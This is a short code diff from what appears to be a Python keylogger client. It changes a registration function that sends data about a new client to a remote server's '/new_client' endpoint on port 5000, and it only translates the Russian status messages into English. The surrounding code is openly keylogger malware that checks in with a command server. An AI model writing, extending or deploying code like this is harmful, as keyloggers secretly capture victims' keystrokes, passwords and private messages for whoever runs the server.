@@ -12,9 +12,9 @@ def registration(server_url, user):
     registration_data = keylogger.registration()
     answer = requests.post(server_url+':5000/new_client', json=registration_data).json()
     if answer['status'] == 'Successfully':
-        print('[+] Регистрация прошла успешно')
+        print('\n[+] Successfully registration')
     else: 
-        print('[+] Регистрация неуспешна')   
+        print('\n[+] Unsuccessfully registration')   
 
 def check_user(server_url, user):
     keylogger = KeyLogger(user)
